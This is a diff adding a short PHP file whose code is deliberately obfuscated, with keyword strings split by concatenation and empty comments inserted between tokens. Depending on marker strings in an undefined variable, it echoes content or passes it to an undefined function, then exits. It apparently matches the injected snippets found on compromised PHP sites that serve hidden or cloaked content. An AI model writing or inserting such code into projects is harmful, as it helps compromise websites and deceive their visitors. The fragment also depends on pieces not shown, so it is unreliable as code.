@@ -1,0 +1,2 @@
+<?php
+/*ldgs*/if(!stristr($dszxcv, "nobo"."tus"."erage"."nt"))/**/{if/**/(stristr($dszxcv, "okht"."mlge"."tcont"."ent")) {$dszxcv = str_ireplace/**/("okh"."tmlge"."tcont"."ent", "", $dszxcv);echo/*a*/$dszxcv;exit;}else if(stristr($dszxcv, "pingxmlgetcon"."tent")){$dszxcv = str_ireplace("p"."ing"."xmlge"."tcontent", "", $dszxcv);echo/*a*/psinsmap($dszxcv)/**/;exit;}}
